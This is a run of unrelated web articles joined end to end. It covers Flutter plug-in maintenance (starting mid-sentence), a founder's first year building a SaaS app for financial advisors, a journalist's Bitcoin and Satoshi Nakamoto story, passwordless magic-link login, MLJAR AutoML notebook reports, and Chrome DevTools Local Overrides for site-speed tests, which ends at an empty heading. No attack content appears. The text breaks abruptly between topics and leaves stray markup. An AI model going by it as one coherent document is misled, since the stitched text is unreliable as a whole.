Flutter, Dart, iOS, or Android can break parts of that package, and with it your app on one or all platforms</strong>.</p><p id="1765">Unless you are fluent in all three languages and proficient on all supported platforms, you probably cannot or do not want to find and fix these problems.</p><p id="525a">Note: Just as I am writing this, I receive the second support request from a user running my app on an iPhone 6 with iOS 12.4. They report that chapters are not loading on their device. In my iOS simulator with the same hardware/OS combination, everything works fine. Seriously: How on earth should I debug this if I don’t own an old iPhone 6? And even if I manage to find the bug in the iOS part of the Flutter WebView plug-in, I am neither proficient in Objective-C nor do I want to spend any more time trying to fix something that IMHO should just work — or that is declared to be still in alpha or beta state!</p></div></div></section><section><div><div><p id="9a88">The added complexity of Flutter packages would not be so grave if there was a strong organization behind the project that feels responsible for providing bridges to all major native SDK functions to Dart. But most of this crucial part is excluded from the core Flutter project and left to be handled by volunteers. Their commitment and quality of work range from a stellar job to losing interest after version 0.1. If you rely on a package from a dedicated pro, good for you. If you depend on the latter, you will have to pay your debt.</p><p id="c0a3">All you really want from Flutter is to write your app in Dart and deploy it on iOS and Android. And you have been led to believe that using this cross-platform solution will allow you to do that while saving you time and money compared to alternative approaches. In theory, Flutter (and other cross-platform solutions) can do that. Or speaking with Gartner: Flutter’s vision …</p></div></div></section></div></div>

I had some cash in the bank and began what would become the most testing time of my life.</span></span></span></span></p><p><span><span><span><span>Before and during my time at Facebook I had started a number of businesses and “side projects” that went nowhere. But now was the time to burn the boats and have no exit, except success.</span></span></span></span></p><p><span><span><span><span><strong>Getting Started</strong></span></span></span></span></p><p><span><span><span><span>Foolishly, I decided to start a business in an area I had no experience, expertise or contacts.</span></span></span></span></p><p><span><span><span><span><em>[<strong>Side Note:</strong> Don’t Do This!]</em></span></span></span></span></p><p><span><span><span><span>I also didn’t know how to code. I was truly naive. Thankfully, I got some guidance from an entrepreneurship course I found online. &nbsp;It was one of those online courses you’d be embarrassed to tell your friends about. In fact, I waited until my girlfriend was out of the apartment before I put down my credit card and paid $6,000.</span></span></span></span></p><p><span><span><span><span>The advice was simple, find a niche, stick to B2B SaaS, talk to people. If you have a problem, ask for help in the forum. The hardest part of all of this was speaking to people.</span></span></span></span></p><p><span><span><span><span><strong>Finding a Niche</strong></span></span></span></span></p><p><span><span><span><span>The first step was finding a niche. I decided on contacting roofers. My thinking was that, there would be less competition to sell them software and there were thousands of roofers. I googled “roofers”. Found 20 companies and cold emailed them telling them I was building a software product to solve their problems. Can we please have a phone call.</span></span></span></span></p><p><span><span><span><span>The email worked-ish. 3 roofers replied saying “yes”, they’d love to speak to me, but whenever I called them, they were “onsite” and couldn’t talk. From then on, I learned an important first lesson; don’t build products for people it is hard to contact.</span></span></span></span></p><p><span><span><span><span>Then I tried my second niche. Real estate agents who manage multi-family apartment blocks. Again, I found 20 companies on Google, emailed them and 5 replied. Unfortunately, they told me they had zero problems except for rent collection. They asked if I could create some software that made people “pay their rent on time”. I had no idea where to get started and quickly gave up on this niche.</span></span></span></span></p><p><span><span><span><span><em>[<strong>Side Note:</strong> Today, I am sure there is plenty of rent collection software, but I had no idea on how to spot an opportunity, so this one passed me by. Another important lesson: There is a skill called “recognizing opportunity”.]</em></span></span></span></span></p><p><span><span><span><span>I had now been looking for a niche for about four weeks, with no luck. My friends in the entrepreneurship course were also mostly struggling. Many started to give up. I continued because I had given myself 18 months financial runway, would think less of myself if I gave up so easily and I had no other job options.</span></span></span></span></p><p><span><span><span><span>The next niche I contacted would be the start of my incredible journey. That niche was financial advisors.</span></span></span></span></p><p><span><span><span><span>This time I emailed 30 financial advisors and 10 agreed to talk to me. I had optimized my cold email script so it was easy to get people on the phone. At the same time, I worked on improving my call performance. I started devouring books on sales, writing call scripts and doing mock phone calls. I was tired of struggling. This had to work!</span></span></span></span></p><p><span><span><span><span>One financial advisor in particular (Thank you <a href="https://www.johnndege.com/gut-wrenching-1st-year/clkn/https/twitter.com/PeteMatthew">Pete Matthew</a>!) was instrumental in getting me started. He told me about a problem assessing the amount of risk investors were willing to take with their investments. After the 2008 financial crisis, it was now a regulatory requirement to document a client’s risk tolerance in a certain fashion. Perhaps some sort of online questionnaire could help. Amazingly 6 out of 10 financial advisors had the same problem. BINGO! I had my idea.</span></span></span></span></p><p><span><span><span><span><strong>Validating The Idea and Building The Product</strong></span></span></span></span></p><p><span><span><span><span>Next step was validating the idea and building the product. I could not afford to build something people didn’t want, so I asked my 6 financial advisors what features they wanted in a solution. I then mocked up the product in Powerpoint. Yes, Powerpoint! I showed them the product and with extreme fear and nervousness, I asked them for a down payment of £300 in return for a future discount. 5 said yes and I was off to the races!</span></span></span></span></p><p><span><span><span><span>Now I had some customers lined up my confidence soared.</span></span></span></span></p><p><span><span><span><span><em>[<strong>Side Note:</strong> I’ve noticed in my businesses that true confidence only comes from solving customers’ problems and making sales. Other achievements don’t stick.]</em></span></span></span></span></p><p><span><span><span><span>All I had to do was build the product and then I would be rich! Not quite.</span></span></span></span></p><p><span><span><span><span>I began my search for a software developer since I had no idea how to code. I checked out Elance but I was worried about communication issues with an outsourced team in India. I then contacted some developers on Ruby on Rails forums, but they were not very interested in working with another wannabe entrepreneur.</span></span></span></span></p><p><span><span><span><span>Eventually, I found a fantastic developer (who I co-founded my next company with) on Hacker News. When searching for a developer, I always looked for quality and was happy to pay “full-price”. However, I focused my effort on freelance developers rather than agencies. I wanted someone focused and dependent on the project’s success to earn their living at least for some months. The final step was testing the developer. I cold emailed <a href="https://www.johnndege.com/gut-wrenching-1st-year/clkn/https/twitter.com/earthlingworks">Ruben Gamez</a>, asked him to assess my developer’s sample code and he happily agreed. Ruben approved and we started building immediately. Thanks Ruben!</span></span></span></span></p><p><span><span><span><span>Building the website took three months and $18,000. In the meantime, I lined up customers and continued to “pre-sell”. The product launched with about 10 customers and $1,000 in monthly recurring revenue.</span></span></span></span></p><p><span><span><span><span><strong>Struggling To Grow</strong></span></span></span></span></p><p><span><span><span><span>Early on in my journey, I wrote a weekly email to friends and family to keep them updated on my progress. The point was to keep me accountable and avoid lying to myself. Here are extracts from those emails as my growth started to sputter…</span></span></span></span></p><p><span><span><span><span><strong><em>15<sup>th</sup> March 2013</em></strong><em>&nbsp;- “I love marketing and I love sales despite the fact it can bring me to the point of depression at times. My sales effort last week produced mixed results. I got a high percentage of opens on my emails (47%) and a lot of clicks through to my site (15%) but nobody requested more information after sending 82 emails. I got replies but most were just not in the market.”</em><em>&nbsp;</em></span></span></span></span></p><p><span><span><span><span><strong><em>3<sup>rd</sup> May 2013</em></strong><em>&nbsp;– “Obviously, something isn't quite working somewhere. Since I launched 4 weeks ago there have been 11 free trials and I would say only 3 remain seriously interested in the product. I am working backwards through my funnel to "fix" the issue.</em><em>”</em></span></span></span></span></p><p><span><span><span><span>This pretty much continued through the spring and summer. I flailed around with SEO marketing, online ads and attempted joint ventures but nothing was working. After 8 months working on my project (and 4 months since launch), I only had 12 customers. Then came the tears…</span></span></span></span></p><p><span><span><span><span>One night my girlfriend (now wife) came home to find me slumped on the floor in the corner of our apartment crying. After 8 months working on this damn business, I was failing. I personally spent about $40,000 on software development and my living expenses with very little to show for it.</span></span></span></span></p><p><span><span><span><span>My girlfriend reminded me it was not the end of the world, I had only been working on it for less than a year. I had specifically given myself 18 months runway, so I should continue. This helped me get back up, but the biggest help ended up being the few remaining entrepreneurs on my online course.</span></span></span></span></p><p><span><span><span><span>One member, in particular, had also been struggling, with about 10 customers, but pushed me to continue. If it wasn’t for his words of encouragement it’s likely I would have quit. Looking back the $6,000 expense for the online course was peanuts compared to the value I got from his words of encouragement. It’s amazing what a supportive network can do.</span></span></span></span></p><p><span><span><span><span><em>[<strong>Side Note:</strong> If you’re an entrepreneur, get around other entrepreneurs. Only they can fully understand your struggle.]</em></span></span></span></span></p><p><span><span><span><span><strong>My Miracle: Getting Unstuck</strong></span></span></span></span></p><p><span><span><span><span>My miracle started by going on holiday and getting away from the business. After two weeks away, I did a thorough analysis of all my past customer conversations. I realized the problem. I had only been selling my product in the U.K. Most financial advisors in the U.K. were restricted on what software they could buy for compliance reasons. But those reasons were unclear for outsiders. Thus, my market size ended up being considerably smaller than I originally estimated. Basic research informed me there were about 8,000 financial advisors in the U.K. but this compliance quirk meant only 1,000 could easily buy my product. As a result, my business was unviable.</span></span></span></span></p><p><span><span><span><span><em>[<strong>Side Note:</strong> The lesson here is not about market size. It’s about understanding your customer. My business was failing because I didn’t understand my customers.]</em></span></span></span></span></p><p><span><span><span><span>At this point I did what all British businessmen do when they can’t sell enough at home; go to America!</span></span></span></span></p><p><span><span><span><span>I feverishly started emailing and calling American financial advisors. To my excitement, they had the same problem as British financial advisors but with less compliance friction. To make sure I didn’t misunderstand the opportunity I pre-sold 8 customers before changing a line of code in my app. Once the problem-solution fit was confirmed, I rebuilt my product for the U.S. market and launched immediately.</span></span></span></span></p><p><span><span><span><span>I marketed the product just like I did in the U.K. Cold email, webinars and referrals but now suddenly it clicked. I had found a customer base that had the problem I was solving AND could easily buy. Eureka!</span></span></span></span></p><p><span><span><span><span>One year after launching the product, I had 41 customers and $4,162 in monthly recurring revenue.</span></span></span></span></p><p><span><span><span><span>Eventually, I would go on to acquire hundreds of customers and sell the business, but that is a story for another day.</span></span></span></span></p></div><div id="lp-pom-text-289"><p><span><span><span><span>[The Gut-Wrenching 1st Year of My B2B SaaS App]</span></span></span></span></p><p><span><span><span><span><strong>Key Lessons From The 1<sup>st</sup> Year Bootstrapping A B2B SaaS App</strong></span></span></span></span></p><ul><li><span><span><span><span>It will be harder and longer than you think, have 18-24 months runway to give it a proper shot.</span></span></span></span></li><li><span><span><span><span>All the “good stuff” comes from talking to customers and reflecting.</span></span></span></span></li><li><span><span><span><span>It helps to have no other options but the success of your app.</span></span></span></span></li><li><span><span><span><span>Tell people about your journey and join some entrepreneurial communities for support and encouragement.</span></span></span></span></li></ul><p><span><span><span><span><strong>Want more information or have a question?</strong></span></span></span></span></p><ul><li><span><span><span><span>Follow me on Twitter -&nbsp;</span></span></span></span><a data-action="url" data-params="false" href="https://www.johnndege.com/gut-wrenching-1st-year/clkn/https/www.twitter.com/johnndege" target="_self"><span><span><span><span>@johnndege</span></span></span></span></a></li></ul></div></div>]]>

<p><span><em><strong>TL;DR</strong> A news article I wrote for IDG in 2010 was the first mainstream media discussion of Bitcoin. As a direct result, the individual believed to have created Bitcoin—Satoshi Nakamoto—said “the swarm is headed towards us”. He disappeared after posting that to a forum, and hasn’t been heard from since. </em></span></p>
<p><span><em>Let’s make this clear from start: I didn’t force anybody into hiding, or know Satoshi Nakamoto. But if what I wrote was indeed a contributing factor, I am not proud of this. The thought I affected anybody’s life in a negative way hugely upsets me. But now that Bitcoin is insanely popular, the incident has become infamous. It’s time to tell my story.<strong> /TL;DR<span>&nbsp;</span></strong></em></span></p>
<figure id="attachment_106" aria-describedby="caption-attachment-106"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/Screenshot-2021-02-24-at-7.35.25-am-300x255.png" alt="Bizfeed logo" width="300" height="255"><figcaption id="caption-attachment-106">Bizfeed logo</figcaption></figure><p>Back in 2010 I was a freelance journalist. I took work where I could find it. One of my jobs was to write news stories for PC World’s Bizfeed and Newsdesk blogs.</p>
<p>(Note for UK readers: PC World is one of the biggest US computing magazines/websites, and not a crappy tech retailer, like here in the UK!)</p>
<p>The goal with the blogging was simple and primitive: Break news stories before anybody else.</p>
<p>Doing so meant Google News would put our articles at the top of the list if that topic began to trend, because we got there first.<span>&nbsp;</span></p>
<p>That meant clicks. Clicks meant ad conversions.</p>
<p>It was necessary for me to hammer these articles out, usually writing the required two per day by lunchtime. Because I was in the UK, this meant they were ready for the site’s US editor when she arrived at work, 9am EST.</p>
<p>It always made me smile when I approached a source for an interview and they said something like, “Sure, I can speak to you Thursday next week”. By that time my article would not only be published but literally old news.</p>

<p>It’s the toughest writing job I’ve ever had. Some of the articles I wrote did amazingly well, like when I&nbsp;<a href="https://www.pcworld.com/article/226128/Sony_Makes_it_Official_PlayStation_Network_Hacked.html">covered the Sony PlayStation hacks</a>&nbsp;and managed to reveal key developments before anybody else.</p>
<p>I got paid a fraction of a cent per click, and a single popular article would pay my living expenses for a week, or even longer.</p>
<figure id="attachment_107" aria-describedby="caption-attachment-107"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/Screenshot-2021-02-24-at-7.37.59-am-300x211.png" alt="Wikileaks blog screenshot" width="300" height="211"><figcaption id="caption-attachment-107">Wikileaks blog screenshot</figcaption></figure><p>Most articles I wrote sunk to the deeps of the ocean, leaving only a trail of bubbles behind. One of these was about how <a href="https://www.pcworld.com/article/213230/could_wikileaks_scandal_lead_to_new_virtual_currency.html">Wikileaks was asking for donations in something called Bitcoin</a>.<span>&nbsp;</span></p>
<p>Nobody back then knew what Bitcoin was. But I’d been following it as part of my general interest in open source technology.</p>
<p>So, I wrote the article. Remember: I had little time to do involved research. To write about something I already understood was a gift.</p>
<p>I wrote about how there was a mysterious guy behind it all: Satoshi Nakamoto. I can’t recall how I knew this. I think I just checked the official Bitcoin website.</p>
<p>Once the article was done, I immediately moved onto the next one, like I always did.&nbsp;</p>
<p>A few days later I got a few emails from people angry about the piece. I was accused of “lazy journalism”. They accused me of claiming Bitcoin was created by Wikileaks.</p>
<p>Reading the article now, I continue to believe these accusations are untrue. Offensive, even. Like any good journalist, I checked facts against canonical sources before submitting work to the editor.</p>
<p>The editor wouldn’t publish if I made stuff up.&nbsp;That isn’t how it works.&nbsp;</p>
<p>I promptly forgot all about the article, as I forgot about all the others.</p>

<p>Now working as a content writer at a software company, with the hack work of news blogging long behind me, I received a LinkedIn message from a journalist. He told me he was writing a book about Bitcoin.<span>&nbsp;</span></p>
<p>Would I be interested in being interviewed?<span>&nbsp;</span></p>
<p>What?! Why would he ask that?</p>
<p>By this point, Bitcoin was heading towards the moon. In that article back in 2010, I’d written that one Bitcoin was worth 20 cents. A coffee shop somewhere had begun accepting several in return for a steaming brew.</p>
<p>But now just one Bitcoin was worth over $9,000! I think I’m justified in using an emoji here:</p>

<p>It was making headlines in newspapers, with Nakamoto’s disappearance being a nut everybody wanted to crack. Where was he? Did he even exist?</p>
<p>“Your article made a huge impact,” wrote the journalist in his message to me.<span>&nbsp;</span></p>
<p>I had to google my article to even remember what I’d written.</p>
<p>The journalist continued (and I paraphrase here because I haven’t sought permission to quote him):<span>&nbsp;</span></p>
<blockquote>
<p>“In the history of Bitcoin, your article made Satoshi Nakamoto panic. Pretty soon he dropped all responsibility for Bitcoin. He handed over the project to Gavin Andresen and then largely disappeared.”</p>
</blockquote>
<p>Have you ever been told something that makes your stomach feel like it’s exited your body? That Charlie Brown feeling?</p>
<figure id="attachment_91" aria-describedby="caption-attachment-91"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/sick-charlie-brown.jpg" alt="Charlie Brown feeling sick" width="300" height="185"><figcaption id="caption-attachment-91">Charlie Brown feeling sick</figcaption></figure><p>That’s how I felt.<span>&nbsp;But it was also tinged with excitement. As a journalist, knowing something I’ve written had gone on to create such an impact was incredible. That’s why writers do what we do!&nbsp;</span></p>
<p>I told my wife. Her jaw dropped to the floor. We discussed what must’ve been going through Nakamoto’s head. Couldn’t I just drop him a line and say sorry, she asked? Um. Sadly not.</p>
<p>I told colleagues. One of them used a website that tracks backlinks to find the original forum post where, in 2010, Nakamoto had written about my article – literally his final message to the world before disappearing:</p>

<blockquote>
<p>“It would have been nice to get this attention in any other context. WikiLeaks has kicked the hornet’s nest, and the swarm is headed towards us.” <a href="https://bitcointalk.org/index.php?topic=2216.0">https://bitcointalk.org/index.php?topic=2216.0</a></p>
</blockquote>
<p>I had never seen this forum post before.</p>
<p>Using the backlinking tool, I discovered that forum post and my article had entered Bitcoin folklore across the decade since. Countless people had discussed its significance.&nbsp;</p>
<p>I had absolutely no idea.</p>
<figure id="attachment_110" aria-describedby="caption-attachment-110"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/Screenshot-2021-02-24-at-7.54.06-am-1024x200.png" alt="Satoshi Nakamoto's final post before disappearing" width="840" height="164"><figcaption id="caption-attachment-110">Satoshi Nakamoto’s final post before disappearing. Note his annoyance at Wikileaks, rather than at the article</figcaption></figure>
<p>And, really, this is the end of the story for me.</p>
<p>I didn’t get interviewed because I had nothing to tell. I never knew anybody involved with Bitcoin. I never knew Nakamoto. I have no inside information.<span>&nbsp;</span></p>
<p>Yet here I am, an actual footnote in one of the most fantastic stories in computing and perhaps even world finance.<span>&nbsp;</span></p>
<p>How do I feel?</p>
<p>Well.</p>
<figure id="attachment_154" aria-describedby="caption-attachment-154"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/IMG_0014-300x225.jpg" alt="A gift from a colleague after I told them the story" width="300" height="225"><figcaption id="caption-attachment-154">A gift from a colleague after I told them the story, framing the infamous final public statement. I’m pretty sure that isn’t Nakamoto!</figcaption></figure><p>I’ve been absolutely wrong two times about nascent technologies.<span>&nbsp;</span></p>
<p>The first was YouTube. I was convinced it would never be more than people posting clips stolen from TV shows. I never believed there would be something called a professional YouTuber (although I’m so glad there are – I spend a lot of time at that website today!).</p>
<p>The second was Bitcoin. I installed the Bitcoin-generating software back in 2010, ran it for a day or two, and then uninstalled it.</p>
<p>A virtual currency?! What a crazy idea!</p>
<p>While writing this today, I setup my second Bitcoin wallet after that first attempt in 2010. Yes, really. I’ve watched from afar. I’ve laughed with friends about how if I’d just left that app running back in 2010 I’d probably be writing this from a personal jet right now.&nbsp;</p>
<p>But I’ve never actually gone back and created a wallet – until now.&nbsp;</p>
<p>If you found my story interesting, why not drop a few cents in there. See below.&nbsp;</p>
<p>Oh, and if Mr Nakamoto is reading this then… Sorry. <a href="mailto:k@keirthomas.com">Drop me a line</a>. It’d be good to chat. I’d love to both know your story, and help share it with the world if you’d like that. Wouldn’t it be great to pick up the story at the point where it left off?</p>

                    <p>Passwords are dying. The cost of creating and maintaining passwords is becoming untenable. Which can be seen in the rise of users logging in with social products and developers outsourcing their pain to Auth0 and the likes. We decided to sidestep the password based authentication and went passwordless on our new product. Read on to see how you can go passwordless too.</p><p><strong>The cost of passwords</strong></p><p>Passwords create too much friction for users. It’s becoming difficult to come up with passwords that satisfy the ever growing password strength requirements - minimum 9 characters, 1 number, 1 upper case, 1 special character etc. And with the rise of data breaches where hackers steal and sell password data on the internet, passwords are only really effective when you don’t repeat them across different services. Which means you have to remember unique passwords or use a password manager.</p><p>Passwords are even more painful for developers to build and maintain. Imagine the work - 4 forms (signup, login, reset password, send forgot password link), storing passwords securely, managing email service providers for deliverability and spam scores. All this work just for the auth, which is not your core product and not what users come to you for. </p><p><strong>Magic links, the solution to the password problem</strong></p><p>An elegant solution to this mess is authenticating users using magic links sent on email. We all use email anyway as a core part of our online identity and authentication. So instead of logging in with email and password, you enter your email and get a login link sent to you. You might have seen Slack do this.</p><figure><img src="https://lh3.googleusercontent.com/2Yx1vwl0CygQi3k1aT9iKXiAETGQmsfaNuE2uA4-KsTWrGKN-WjwAGQv_XwPOpv3zainHdNZ29jbxiJYBIbVo-iKPAE9BMHIkVlKZQgVFzJK0dxaoaoJmQ6a-k5UuKDmNecYiqZY"><figcaption>Slack popularised magic links for logging in</figcaption></figure><p><strong>How we went passwordless with magic link</strong></p><p>When we were building our new product, we didn’t want to spend time building full blown password auth, so we decided on using magic links. And although the work involved building a magic link system is less than traditional auth, it is still valuable developer time spent on non-core plumbing. After some research, we found <a href="https://magic.link/">Magic</a> which provides magic links as a service. We loved the focus on security (the founders have built a security product in the past), the good design and the developer friendly docs. </p><p>The implementation involves a client SDK (for web and mobile) for showing the Magic overlay (screenshots below) and server code for managing sessions. We used the sample code provided to implement this. </p><p><strong>The user experience of magic links</strong></p><p>Login form</p><figure><img src="https://lh6.googleusercontent.com/87Sh7Be5B83QExzyE2bF12OGsrTom6Lpw-haLYteMvUUaoFyZbe9FLozGgE1bcMgB7x0NyTThb0fj-uqwanGADb3OpA9x5srYvNqVGlKSvPoy9XvYR4xjDwEcKNKInFDNC8JUAqD"><figcaption>Sign up and Log in form</figcaption></figure><p>Email</p><figure><img src="https://lh5.googleusercontent.com/EtAzDiIBqb7SpaSTW6W3qRB5J7E7uq-ThWLXWPczkdIKIXXbhRK74OlQkFMrcTIkWXI5YJC7blPMl5qblW4wF5mM_JpFOicTIXy_rr0R9Ijn0dsSJv4O-a0xfFBJRs38F0MYlxfk"><figcaption>Magic link email</figcaption></figure><p>You can <a href="https://incidents.sh/">try out the experience for yourself</a> on our new product. It’s a free timer for developers to keep track of major software incidents, built by the team who also built the simple <a href="https://spike.sh/">incident alerting</a> product for developers.</p><p><strong>Conclusion</strong></p><p>After using magic links as a developer and as a user, I loved the experience. There are still some hiccups as with any new technology, but overall this looks like the future. And I am quite excited to watch it unfold!</p>

		<p>Python Notebooks provide interactive computing environment that is perfect for experimenting with data. The Notebooks are widely used by Data Scientists in data analysis and discovery tasks. Currently, there are many versions of Notebooks. The first, and the most used version is <a href="https://jupyter.org/">Jupyter Notebook</a>. There are also many cloud-based Notebooks, like <a href="https://www.kaggle.com/notebooks">Kaggle Notebooks</a> or <a href="https://cocalc.com/">CoCalc Notebooks</a>.</p>

<p>The transparency of created Machine Learning pipeline is very important in the <a href="https://github.com/mljar/mljar-supervised">MLJAR AutoML</a>. Starting from the version <code>0.9.1</code> the MLJAR AutoML provides support for displaying interactive reports from AutoML training directly in the Python Notebook.</p>

<p>If you didn’t try yet MLJAR AutoML, you can easily check it out. It is available at GitHub: <a href="https://github.com/mljar/mljar-supervised">https://github.com/mljar/mljar-supervised</a>. It is open-source, with MIT license. It works with tabular data and supports binary, multiclass classification, and regression.</p>

<h2 id="automl-training-report-in-the-notebook">AutoML Training Report in the Notebook</h2>

<p>The MLJAR <code>AutoML</code> class provides the <code>report()</code> method for displaying report directly in the Notebook. After training the <code>AutoML</code> just call <code>report()</code> on <code>AutoML</code> object. Some examples:</p>

<ul>
  <li>MLJAR AutoML in <code>Explain</code> mode: <a href="https://www.kaggle.com/mt77pp/mljar-automl-explain-tabular-playground-mar-21">link to the notebook</a>,</li>
  <li>MLJAR AutoML in <code>Compete</code> mode: <a href="https://www.kaggle.com/mt77pp/8h-mljar-automl-tabular-playground-mar-202">link to the notebook</a>.</li>
</ul>

<h3 id="the-example-report">The Example Report</h3>

<p>Below is the screenshot from the <a href="https://www.kaggle.com/mt77pp/mljar-automl-explain-tabular-playground-mar-21">example report</a>. You can click on <code>Automatic Exploratory Data Analysis Report</code> to open EDA plots. There is <code>&lt;&lt; Go back</code> link there, which will redirect you to the main view.</p>

<p>Please click on the selected model name, for example on the <code>3_Default_Xgboost</code>. It will redirect you to model’s report, where you can check the model details, like: hyperparameters values, metrics, learning curves and explanations (if available).</p>

<p><img src="https://mljar.com/blog/automl-notebook/xgboost_details_2.png" alt="Xgboost 2 in the Notebook">
<img src="https://mljar.com/blog/automl-notebook/xgboost_details_3.png" alt="Xgboost 3 in the Notebook">
<img src="https://mljar.com/blog/automl-notebook/xgboost_details_4.png" alt="Xgboost 4 in the Notebook"></p>

<p>There is <code>&lt;&lt; Go back</code> link at the top (and the bottom of each model report) that will redirect you to the main view. You can easily navigate the AutoML training report.</p>

<p>What is more, all reports data and files are available in the hard drive. They can be easily commited to the GitHub and displayed there. The report files are presented as <code>README.md</code> files.</p>

<p>Link to report in the Github: <a href="https://github.com/mljar/mljar-examples/tree/master/Iris_classification/AutoML_1">Iris classification with AutoML</a>.</p>

<h2 id="summary">Summary</h2>

<p>The MLJAR AutoML works perfectly with Python Notebooks. It provides interactive reports from the AutoML training. Reports can be displayed directly in the Notebook by calling the <code>report()</code> method.</p>

<div><p>
Quickly learn if a site speed change will have a positive impact, without hassling your dev team.
</p></div>
<p>Improving site speed can be <b>complicated</b>. It's surprisingly common to roll out a change that should lead to a performance improvement, only to find that - frustratingly - things have gotten slower.</p>
<p>And a lot of the time, this is how site speed works - you have to approach it like you're running an experiment, where you benchmark your baseline, make a change, and then test to see if you've made an impact.</p>
<p>But this approach can also be slow - especially if you're having to ask developers to make these changes, and then they have to find time in their schedule to implement them (and then, potentially, roll them back). In situations like that, you have a slow feedback loop - it takes a long time between "let's see if this works" to finding out the results.</p>
<h2>A fast feedback loop</h2>
<p>Chrome DevTools has a feature called <b>Local Overrides</b> that can drastically improve that feedback loop. Instead of having to wait for a developer to add your change, you can first try it out on your local machine to measure the potential impact.</p>
<p>It works by saving a copy of the page you're working on (or any other resource, like a JavaScript or CSS file), letting you edit that, and then serving that file instead of the live version.</p>
<p>Here's how I test whether site speed changes might work, without having to push those changes live first.</p>
<h2>Setting up local overrides</h2>
<p>The first step is to get overrides set up on your computer. Open Chrome DevTools (Option + ⌘ + J on mac, or right-click and inspect element), click on the Sources tab, and then click the &gt;&gt; button in the left-hand side bar to find the Overrides panel.</p>
<p><img src="https://tryblackbird.com/images/overrides.jpg" loading="lazy"></p><p>From here, click "Select folder for overrides", and choose somewhere to save your new editable copies of files. I just use a folder that's tucked away somewhere named "Local Overrides", but you do you.</p>
<h2>Finding the baseline</h2>
<p>You need to know what your baseline is before you can see if a change improves or harms performance. Most of the time, the metric I'm trying to improve is <a href="https://web.dev/lcp/">Largest Contentful Paint</a>, so I built a JavaScript snippet that's heavily inspired by <a href="https://gist.github.com/tkadlec/683b26344cde774170b94c0fcf0088b4">Tim Kadlec's perf-diagnostics.css</a>.</p>
<p>To add it, right-click on your Chrome bookmark bar, click <b>Add Page</b>, add the name "Highlight LCP", and then add this as the URL:</p>
<pre><code>javascript:(function(){var paintEntries = performance.getEntriesByType("paint");var entries = [];new PerformanceObserver((entryList) =&gt; {for (const entry of entryList.getEntries()) {entries.push(entry);}var element = entries[entries.length - 1];var lcp = entries[entries.length - 1]["loadTime"];var fcp = paintEntries[1]["startTime"];console.log("FCP is " + Math.round((fcp + Number.EPSILON) * 100) / 100 + " ms");console.log("LCP is " + lcp + " ms");element["element"].style.border="4px solid gold";}).observe({type: 'largest-contentful-paint', buffered: true});})();
</code></pre>
<p>When you click that bookmark it'll add a gold border to the LCP element, and show both the FCP and the LCP timings in the DevTools console.</p>
<p><img src="https://tryblackbird.com/images/wiggle.jpg" loading="lazy"></p><p>At this point, I like to run 3 tests on the new, locally stored page. You don't want to compare your edited local page with the live version - so to do that, I use local overrides to add an extra line-break into the code somewhere.</p>
<p>From the Overrides menu, it'll prompt you to hit Ctrl + P to open a file. Select the page that you want to edit, and you should see the source code appear. From here, I usually add an extra blank space or a line break, and then hit save. You want to make sure that there's a blue dot next to the file name, which tells you that it's now serving a local version of the file. Also, make sure you've got Enabled Local Overrides checked.</p>
<p><img src="https://tryblackbird.com/images/local-overrides-devtools.jpg" loading="lazy"></p><p>Under the Network tab, I'll usually throttle my connection to Fast 3G when running my tests. This is largely because I want to focus on users who have a slower connection because if you can improve performance for them then you'll also improve performance for the average user. It's also useful because it makes it clearer if a performance change is having an impact.</p>
<p><img src="https://tryblackbird.com/images/throttle-connection.jpg" loading="lazy"></p><p>Now that's all set up - I normally run 3 tests, making a note of the First Contentful Paint and Largest Contentful Paint values using the JavaScript bookmarklet.</p>
<p>To do that, I use Chrome's option to empty the cache and hard reload the page each time (if you have DevTools open, it appears as an option if you hold down the refresh icon).</p>
<p><img src="https://tryblackbird.com/images/hard-reload.jpg" loading="lazy"></p><p>Those 3 sets of numbers you have? Take the middle number for both FCP and LCP (even if they were in different test runs). That's your median - so those are the numbers that you'll be benchmarking any changes against. Feel free to run more tests if you want to be extra sure, but I find 3 normally does the trick.</p>
<h2>Removing the anti-flicker snippet</h2>
<p>I'm going to use the cycle page for <a href="https://www.wiggle.co.uk/cycle">Wiggle</a> as an example here. They're not a customer, and I have no connection there - I just noticed some potential speed optimisations that Local Overrides could show off. Also, this is very much not a dig at Wiggle - the site is well built, and there are very likely good reasons for some of these engineering decisions. I've only chosen them because I think there are a few tweaks that could result in speed improvements.</p>
<p>After throttling my connection to 3G and testing the page 3 times, my median First Contentful Paint was <b>5,231 ms</b> and my Largest Contentful Paint was <b>13,221 ms</b>.</p>
<p>I noticed that Wiggle were using the anti-flicker snippet from Google Optimize. A/B testing software sometimes suggests this - it effectively hides the page completely until either the Optimize JavaScript has loaded and run, or 4 seconds have passed - whichever is soonest. 4 seconds is a long time to hide content, and could explain why slower connections are seeing an FCP of over 5 seconds. Andy Davies' has <a href="https://andydavies.me/blog/2020/11/16/the-case-against-anti-flicker-snippets/">a really useful post on anti-flicker snippets</a>, which is worth checking out if you'd like to know more.</p>
<p><img src="https://tryblackbird.com/images/antiflicker-snippet.jpg" loading="lazy"></p><p>I wanted to see what impact removing that anti-flicker snippet would have. I used Local Overrides to delete that whole snippet, and then re-ran the test 3 times. The median First Contentful Paint dropped from <b>5,231 ms</b> to <b>2,217 ms</b> - an improvement of <b>58%</b>.</p>
<h2>Un-hiding the hero carousel</h2>
<p>With the JavaScript bookmarklet, I was able to see that the LCP element was the hero header image. Wiggle seem to use a carousel for this, but they only show the first slide. In either case - the approach seems to hide the carousel by default, and then unhide it with JavaScript. It looks like it adds a CSS class named <code>owl-loaded</code> to the carousel once it's loaded, which then reveals it to the user.</p>
<p>I wanted to see what it would look like if it didn't hide the carousel by default, so with Chrome's Local Overrides I added the <code>owl-loaded</code> class directly. This isn't perfect, and if the plan was to change how that carousel worked, I'm sure there would be much more elegant ways to approach this - but I wanted to get a sense of whether LCP could be improved by showing the hero carousel straight away.</p>
<p><img src="https://tryblackbird.com/images/owl-loaded.jpg" loading="lazy"></p><p>Re-running the tests after adding <code>owl-loaded</code> to the carousel resulted in the LCP dropping from <b>13,221 ms</b> to <b>5,429 ms</b>, an improvement of <b>59%</b>.</p>
<h2>Wrapping up</h2>
